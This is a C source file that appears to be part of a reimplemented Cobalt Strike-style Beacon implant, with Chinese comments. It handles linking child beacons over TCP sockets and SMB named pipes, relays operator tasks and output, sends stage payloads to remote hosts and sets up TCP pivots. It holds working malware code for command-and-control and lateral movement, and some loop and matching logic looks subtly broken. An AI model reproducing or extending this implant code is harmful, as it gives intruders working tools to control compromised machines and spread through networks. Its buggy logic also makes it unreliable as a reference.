#include "ChildBeacon.h"
#include "Beaconrportfwd.h"


//连接的所有子beacon
ChildBeaconInfo gChildBeaconInfo[40] = {0};
int gChildBeaconInfoSize = 40;

void BeaconNull()
{
	return;
}

//************************************
// Method:    GetChildBeaconMsgHeader
// FullName:  GetChildBeaconMsgHeader
// Access:    public 
// Returns:   char*
// Qualifier:获取子beacon (tcp或者smb) 通信消息头
// Parameter: int id
// Parameter: int * out_size
// Parameter: DWORD size
//************************************
char* GetChildBeaconMsgHeader(int id, int* out_size, DWORD size)
{
	datap pdatap;
	char* frame_header;
    if (id==57){
        frame_header = decryptString(shark_57smb);
    }
    if (id==58){
        frame_header = decryptString(shark_58tcp);
    }
	BeaconDataParse(&pdatap, frame_header, 128);
	int datasize = BeaconDataShort(&pdatap);

	char* messagesheader = BeaconDataPtr(&pdatap, datasize);

	//Packer packer = new Packer();
	//packer.addShort(bytes.length + 4);
	//packer.append(bytes);

	*(int*)&messagesheader[datasize - 4] = size;
	*out_size = datasize;
	return messagesheader;
}

/// <summary>
/// recv函数包装
/// </summary>
/// <param name="size"></param>
/// <param name="s"></param>
/// <param name="data"></param>
/// <returns></returns>
int RecvTcpData(int size, SOCKET s, char* data)
{
	int number = 0;
	if (size <= 0)
	{
		if (number == size)
		{
			return size;
		}
	}
	else
	{
		while (1)
		{
			int retsize = recv(s, &data[number], size - number, 0);
			if (retsize == -1)
			{
				break;
			}
			if (retsize)
			{
				number += retsize;
				if (number < size)
				{
					continue;
				}
			}
			if (number == size)
			{
				return size;
			}
			retsize -1;
		}
	}
	return -1;
}

int recvTcpChildBeacon(ChildBeacon* pTcpBeacon, char* pdata, int size)
{
	int outsize;
	char* data = GetChildBeaconMsgHeader(58, &outsize, 0);
	int recvsize = RecvTcpData(outsize, pTcpBeacon->tcp, data);
	if (recvsize == -1)
	{
		return -1;
	}
	if (recvsize != outsize)
	{
		return -1;
	}
	int len = *(DWORD*)&data[outsize - 4];
	if (len > size || len < 0)
	{
		return -1;
	}
	else
	{
		return RecvTcpData(len, pTcpBeacon->tcp, pdata);
	}
}

/// <summary>
/// send函数包装
/// </summary>
/// <param name="s"></param>
/// <param name="buf"></param>
/// <param name="len"></param>
/// <returns></returns>
BOOL SendTcpData(SOCKET s, char* buf, int len)
{
	return !len || send(s, buf, len, 0) != -1;
}

BOOL sendTcpChildBeacon(ChildBeacon* pTcpBeacon, char* buffer, int buffsize)
{

	int len;
	char* data = GetChildBeaconMsgHeader(58, &len, buffsize);
	BOOL ret = SendTcpData(pTcpBeacon->tcp, data, len);
	if (ret)
	{
		return SendTcpData(pTcpBeacon->tcp, buffer, buffsize);
	}
	return ret;
}


int closeTcpChildBeacon(ChildBeacon* pTcpBeacon)
{
	shutdown(pTcpBeacon->tcp, 2);
	return closesocket(pTcpBeacon->tcp);
}

int checkTcpChildBeaconTimeout(SOCKET s, int time)
{

	int timea = 0;
	int timeout = time + GetTickCount();

	u_long argp = 1;
	if (ioctlsocket(s, FIONBIO, &argp) == -1)
	{
		return 0;
	}
	char buf;
	while (GetTickCount() < timeout)
	{
		int recvsize = recv(s, &buf, 1, 2);
		if (!recvsize)
		{
			timea = 0;
			break;
		}
		if (recvsize > 0)
		{
			timea = 1;
			break;
		}
		if (WSAGetLastError() != 10035)
		{
			timea = 0;
			break;
		}
		Sleep(0xA);
	}
	argp = 0;
	return ioctlsocket(s, FIONBIO, &argp) != -1 ? timea : 0;
}

int checkTcpChildBeacon(ChildBeacon* pTcpBeacon, int time)
{
	return checkTcpChildBeaconTimeout(pTcpBeacon->tcp, time);
}

/// <summary>
/// 初始化tcp子beacon
/// </summary>
/// <param name="conn"></param>
/// <param name="pTcpBeacon"></param>
/// <returns></returns>
ChildBeacon* InitTcpChildBeacon(SOCKET conn, ChildBeacon* pTcpBeacon)
{


	u_long argp = 0;
	ioctlsocket(conn, FIONBIO, &argp);
	pTcpBeacon->FlushFileBuffers = (FlushFileBuffers_ptr)BeaconNull;
	pTcpBeacon->null2 = BeaconNull;
	pTcpBeacon->tcp = conn;
	pTcpBeacon->recvChildBeacon = recvTcpChildBeacon;
	pTcpBeacon->sendChildBeacon = sendTcpChildBeacon;
	pTcpBeacon->closeChildBeacon = closeTcpChildBeacon;
	pTcpBeacon->checkChildBeacon = checkTcpChildBeacon;
	return pTcpBeacon;
}


SOCKET ConnectTcp(char* name, u_short port)
{
	struct sockaddr address;
	SOCKET s = socket(2, 1, 0);
	if (s == -1)
	{
		return -1;
	}
	hostent* hptr = gethostbyname(name);
	if (!hptr)
	{
		return -1;
	}
	memcpy(&address.sa_data[2], *(const void**)hptr->h_addr_list, hptr->h_length);
	address.sa_family = 2;
	*(short*)address.sa_data = htons(port);

	if (connect(s, &address, 16))
	{
		closesocket(s);
		return -1;
	}
	return s;
}

/// <summary>
/// 参数smb和tcp传递的应都是一个ChildBeacon
/// </summary>
/// <param name="port"></param>
/// <param name="smb"></param>
/// <param name="tcp"></param>
/// <param name="recvChildBeacon"></param>
/// <param name="sendChildBeacon"></param>
/// <param name="closeChildBeacon"></param>
/// <param name="BeaconNULL">此参数针对smbFlushFileBuffers</param>
/// <param name="checkChildBeacon"></param>
/// <returns></returns>
int __cdecl AddChildBeacon(
	u_long port,
	ChildBeacon* smb,
	ChildBeacon* tcp,
	recvChildBeacon_ptr recvChildBeacon,
	sendChildBeacon_ptr sendChildBeacon,
	closeChildBeacon_ptr closeChildBeacon,
	void* BeaconNULL,
	checkChildBeacon_ptr checkChildBeacon)
{

	char buffer[256] = { 0 };
	if (!checkChildBeacon(smb, 30000))
	{
		return 0;
	}

	int recvsize = recvChildBeacon(tcp, buffer, 256);
	if (recvsize < 0)
	{
		return 0;
	}
	//取出子beacon id
	int ChildBeaconId = *(DWORD*)buffer;

	//寻找空闲的结构体
	int index_idle = -1;
	for (size_t i = 0; i < gChildBeaconInfoSize; i++)
	{

		if (gChildBeaconInfo[i].state == 0)
		{
			index_idle = i;
			break;
		}
	}
	//没找到直接发送error并返回
	if (index_idle == -1)
	{
		BeaconErrorNA(5);
		return 0;
	}
	gChildBeaconInfo[index_idle].time = 0;
	BOOL checkingdata = gChildBeaconInfo[index_idle].ChildBeaconData == 0;
	gChildBeaconInfo[index_idle].state = 1;
	gChildBeaconInfo[index_idle].ChildBeaconId = ChildBeaconId;


	//添加到全局结构体
	gChildBeaconInfo[index_idle].ChildBeaconConfig.tcp = smb->tcp;
	gChildBeaconInfo[index_idle].ChildBeaconConfig.smb = smb->smb;
	gChildBeaconInfo[index_idle].ChildBeaconConfig.checkChildBeacon = smb->checkChildBeacon;
	gChildBeaconInfo[index_idle].ChildBeaconConfig.closeChildBeacon = smb->closeChildBeacon;
	gChildBeaconInfo[index_idle].ChildBeaconConfig.FlushFileBuffers = smb->FlushFileBuffers;
	gChildBeaconInfo[index_idle].ChildBeaconConfig.null2 = smb->null2;
	gChildBeaconInfo[index_idle].ChildBeaconConfig.recvChildBeacon = smb->recvChildBeacon;
	gChildBeaconInfo[index_idle].ChildBeaconConfig.sendChildBeacon = smb->sendChildBeacon;

	if (checkingdata)
	{
		gChildBeaconInfo[index_idle].ChildBeaconData = (char*)malloc(256);
	}
	formatp pdata;
	BeaconFormatInit(&pdata, gChildBeaconInfo[index_idle].ChildBeaconData, 256);
	BeaconFormatInt(&pdata, ChildBeaconId);               // 子beacon id
	BeaconFormatInt(&pdata, port);                   // 子beacon 端口
	BeaconFormatAppend(&pdata, &buffer[4], recvsize - 4);    // 子beacon 返回数据
	int ChildBeaconDatalength = BeaconFormatlength(&pdata);
	char* ChildBeaconData = gChildBeaconInfo[index_idle].ChildBeaconData;
	gChildBeaconInfo[index_idle].ChildBeaconDataSize = ChildBeaconDatalength;
	BeaconTaskOutput(ChildBeaconData, ChildBeaconDatalength, 10);
	return 1;
}

/// <summary>
/// 连接tcp子Beacon
/// </summary>
/// <param name="Taskdata"></param>
/// <param name="Task_size"></param>
void connect_tcp_child_Beacon(char* Taskdata, int Task_size)
{
	
	DWORD timeout = GetTickCount() + 15000;
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	short port = BeaconDataShort(&pdatap);
	char* name = BeaconDataBuffer(&pdatap);
	init_socket_options();
	SOCKET conn;
	while (1)
	{
		if (GetTickCount() >= timeout)
		{
			BeaconErrorD(0x44, WSAGetLastError());
			return;
		}
		conn = ConnectTcp(name, port);
		if (conn != -1)
		{
			break;
		}
		Sleep(1000);
	}
	ChildBeacon TcpBeacon = {0};
	InitTcpChildBeacon(conn, &TcpBeacon);
	AddChildBeacon(
		port | 0x100000,
		&TcpBeacon,
		&TcpBeacon,
		TcpBeacon.recvChildBeacon,
		TcpBeacon.sendChildBeacon,
		TcpBeacon.closeChildBeacon,
		TcpBeacon.FlushFileBuffers,
		TcpBeacon.checkChildBeacon);
}


void BeaconUnlink(u_long ChildBeaconId)
{
	size_t i;
	for (i = 0; i <= gChildBeaconInfoSize; i++)
	{
		if (ChildBeaconId == gChildBeaconInfo[i].ChildBeaconId || gChildBeaconInfo[i].state == 1)
		{
			break;
		}
		if (i >= gChildBeaconInfoSize)
		{
			return;
		}
	}
	ChildBeaconId = htonl(ChildBeaconId);
	BeaconTaskOutput((char*)&ChildBeaconId, 4, 0xB);


	gChildBeaconInfo[i].ChildBeaconConfig.closeChildBeacon(&gChildBeaconInfo[i].ChildBeaconConfig);

	gChildBeaconInfo[i].ChildBeaconId = 0;
	gChildBeaconInfo[i].state = 0;
	gChildBeaconInfo[i].time = 0;
}

char* pChildbeacondata = NULL;

/// <summary>
/// 当存在子beacon时cs会不断发送22功能号调用此函数
/// </summary>
/// <param name="Taskdata"></param>
/// <param name="Task_size"></param>
void BeaconRequestChildBeacon(char* Taskdata, int Task_size)
{
	if (!pChildbeacondata)
	{
		pChildbeacondata = (char*)malloc(0x100000u);
	}
	int ChildBeaconId = ntohl(*(u_long*)Taskdata);

	size_t i;
	for (i = 0; i <= gChildBeaconInfoSize; i++)
	{
		if (ChildBeaconId == gChildBeaconInfo[i].ChildBeaconId || gChildBeaconInfo[i].state == 1)
		{
			int retsize = 0;
			if (Task_size - 4 <= 0)
			{
				retsize = gChildBeaconInfo[i].ChildBeaconConfig.sendChildBeacon(
					&gChildBeaconInfo[i].ChildBeaconConfig,
					0,
					0
				);
			}
			else
			{
				retsize = gChildBeaconInfo[i].ChildBeaconConfig.sendChildBeacon(
					&gChildBeaconInfo[i].ChildBeaconConfig,
					Taskdata + 4,
					Task_size - 4
				);
			}
			if (retsize)
			{
				*(int*)pChildbeacondata = *(int*)Taskdata;
				BOOL check = gChildBeaconInfo[i].ChildBeaconConfig.checkChildBeacon(
					&gChildBeaconInfo[i].ChildBeaconConfig,
					300000
				);
				int outsize = 0;
				if (check)
				{
					outsize = gChildBeaconInfo[i].ChildBeaconConfig.recvChildBeacon(
						&gChildBeaconInfo[i].ChildBeaconConfig,
						pChildbeacondata + 4,
						0x100000 - 4
					);
				}
				else
				{
					outsize = -1;
				}

				if (outsize <= 0)
				{
					if (outsize)
					{
						BeaconUnlink(ChildBeaconId);
					}
					else
					{
						BeaconTaskOutput(pChildbeacondata, 4u, 0xC);
					}
				}
				else
				{
					BeaconTaskOutput(pChildbeacondata, outsize + 4, 0xC);
				}
			}
			else
			{
				BeaconUnlink(ChildBeaconId);
			}


		}
		if (i >= gChildBeaconInfoSize)
		{
			return;
		}
	}
	
}

int SendStageTCP(char* Taskdata, int Task_size)
{
	int timeout = GetTickCount() + 60000;
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	char* name = BeaconDataPtr2(&pdatap);
	int port = BeaconDataInt(&pdatap);
	char* buf = (char*)BeaconDataBuffer(&pdatap);
	int len = BeaconDataLength(&pdatap);
	init_socket_options();
	SOCKET s =0;
	while (1)
	{
		if (GetTickCount() >= timeout)
		{
			BeaconErrorNA(0x46);
			Sleep(1000);
			return closesocket(s);
		}
		s = ConnectTcp(name, port);
		if (s != -1)
		{
			break;
		}
		Sleep(1000);
	}
	send(s, buf, len, 0);
	Sleep(1000);
	return closesocket(s);
}


/////smb beacon

BOOL __cdecl BeaconFlushFileBuffers(ChildBeacon* pSmbBeacon)
{
	return FlushFileBuffers(pSmbBeacon->smb);
}

int RecvSmbData(HANDLE hFile, char* buffer,int size)
{
	
	DWORD NumberOfBytesRead = 0;
	int readsize = 0;
	if (size <= 0)
	{
		if (readsize == size)
		{
			return readsize;
		}
	}
	else
	{
		while (ReadFile(hFile, &buffer[readsize], size - readsize, &NumberOfBytesRead, 0) && NumberOfBytesRead)
		{
			readsize += NumberOfBytesRead;
			if (readsize >= size)
			{
				if (readsize == size)
				{
					return readsize;
				}
				return -1;
			}
		}
	}
	return -1;
}

int __cdecl recvSmbChildBeacon(ChildBeacon* pSmbBeacon, char* data, int size)
{
	int outsize;
	char* buffer = GetChildBeaconMsgHeader(57, &outsize, 0);

	int read = RecvSmbData(pSmbBeacon->smb, buffer, outsize);
	if (read == -1)
	{
		return -1;
	}
	if (read != outsize)
	{
		return -1;
	}
	int datasize = *(int*)&buffer[outsize - 4];
	if (datasize > size || datasize < 0)
	{
		return -1;
	}
	else
	{
		return RecvSmbData(pSmbBeacon->smb, data, datasize);
	}
}

BOOL __cdecl SendSmbData(HANDLE hFile, char* buffer, int buffersize)
{
	DWORD NumberOfBytesWritten = 0;
	int Writesize =0;
	if (buffersize > 0)
	{
		while (1)
		{
			int nNumberOfBytesToWrite = buffersize - Writesize;
			if (nNumberOfBytesToWrite > 0x2000)
			{
				nNumberOfBytesToWrite = 0x2000;
			}
			if (!WriteFile(hFile, &buffer[Writesize], nNumberOfBytesToWrite, &NumberOfBytesWritten, 0))
			{
				break;
			}
			Writesize += NumberOfBytesWritten;
			if (Writesize >= buffersize)
			{
				return 1;
			}
		}
		return 0;
	}
	return 1;
}

BOOL __cdecl sendSmbChildBeacon(ChildBeacon* pSmbBeacon, char* data, int size)
{
	int outsize;
	char* buffer = GetChildBeaconMsgHeader(57, &outsize, size);
	if (SendSmbData(pSmbBeacon->smb, buffer, outsize))
	{
		return SendSmbData(pSmbBeacon->smb, data, size);
	}
	return 0;
}
BOOL __cdecl closeSmbChildBeacon(ChildBeacon* pSmbBeacon)
{
	DisconnectNamedPipe(pSmbBeacon->smb);
	return CloseHandle(pSmbBeacon->smb);
}
int __cdecl checkSmbChildBeaconTimeout(HANDLE hNamedPipe, int timeout)
{
	DWORD TotalBytesAvail;
	int time = timeout + GetTickCount();
	if (GetTickCount() < time)
	{
		while (PeekNamedPipe(hNamedPipe, 0, 0, 0, &TotalBytesAvail, 0))
		{
			if (TotalBytesAvail)
			{
				return 1;
			}
			Sleep(10);
			if (GetTickCount() >= time)
			{
				return 0;
			}
		}
	}
	return 0;
}
int __cdecl checkSmbChildBeacon(ChildBeacon* pSmbBeacon, int timeout)
{
	return checkSmbChildBeaconTimeout(pSmbBeacon->smb, timeout);
}


/// <summary>
/// 初始化smb beacon
/// </summary>
/// <param name="pSmbBeacon"></param>
/// <param name="conn"></param>
/// <returns></returns>
ChildBeacon* InitSmbChildBeacon(ChildBeacon* pSmbBeacon, HANDLE conn)
{
	pSmbBeacon->smb = conn;
	pSmbBeacon->recvChildBeacon = recvSmbChildBeacon;
	pSmbBeacon->sendChildBeacon = sendSmbChildBeacon;
	pSmbBeacon->closeChildBeacon = closeSmbChildBeacon;
	pSmbBeacon->FlushFileBuffers = BeaconFlushFileBuffers;
	pSmbBeacon->checkChildBeacon = checkSmbChildBeacon;
	pSmbBeacon->null2 = BeaconNull;
	return pSmbBeacon;
}


void ConnectSmbBeacon(LPCSTR Name)
{

	int timeout = GetTickCount() + 15000;
	HANDLE HFile;
	while (1)
	{
		HFile = CreateFileA(Name, GENERIC_READ|GENERIC_WRITE, 0, 0, 3u, 0x100000, 0);
		if (HFile != (HANDLE)-1)
		{
			break;
		}
		if (GetLastError() == 231)
		{
			WaitNamedPipeA(Name, 0x2710);
		}
		else
		{
			Sleep(0x3E8u);
		}
		if (GetTickCount() >= timeout)
		{
			if (HFile == (HANDLE)-1)
			{
				if (GetLastError() == 121)
				{
					BeaconErrorNA(4);
				}
				else
				{
					BeaconErrorD(20, GetLastError());
				}
				return;
			}
		}
	}
	DWORD Mode = PIPE_READMODE_MESSAGE;
	ChildBeacon SmbBeacon = { 0 };
	if (SetNamedPipeHandleState(HFile, &Mode, 0, 0))
	{
		InitSmbChildBeacon(&SmbBeacon, HFile);
		if (AddChildBeacon(
			445,
			&SmbBeacon,
			&SmbBeacon,
			SmbBeacon.recvChildBeacon,
			SmbBeacon.sendChildBeacon,
			SmbBeacon.closeChildBeacon,
			SmbBeacon.FlushFileBuffers,
			SmbBeacon.checkChildBeacon))
		{
			return;
		}
	}
	else
	{
		BeaconErrorD(0x14u, GetLastError());
	}
	DisconnectNamedPipe(HFile);
	CloseHandle(HFile);
}

void link_Smb_Beacon(char* Taskdata)
{
	ConnectSmbBeacon(Taskdata);
}


//************************************
// Method:    BeaconTcpPivot
// FullName:  BeaconTcpPivot
// Access:    public 
// Returns:   void
// Qualifier:功能号82 tcp中转
// Parameter: char * Taskdata
// Parameter: int TaskdataSize
//************************************
void BeaconTcpPivot(char* Taskdata, int TaskdataSize)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, TaskdataSize);
	short port = BeaconDataShort(&pdatap);
	SOCKET s = BeaconNewSocket(0, port, 10);
	if (s == -1)
	{
		BeaconErrorD(0x15u, port);
	}
	else
	{
		Add_Beacon_Rportfwd(sub_10006D6B(), s, 0, 3, port, 2);
	}
}

/// <summary>
/// 发送所有存活的子beacon id
/// </summary>
void CheckChildBeacon()
{
	ChildBeaconInfo* pgChildBeaconInfo = gChildBeaconInfo;
	for (size_t i = 0; i < gChildBeaconInfoSize; i++)
	{
		if (pgChildBeaconInfo[i].state == 1 && pgChildBeaconInfo[i].time < GetTickCount())
		{
			pgChildBeaconInfo[i].time = GetTickCount()+ 15000;
			int ChildBeaconId= pgChildBeaconInfo[i].ChildBeaconId;
			ChildBeaconId = htonl(ChildBeaconId);
			BeaconTaskOutput((char*)&ChildBeaconId, 4u, 14);
		}
	}
}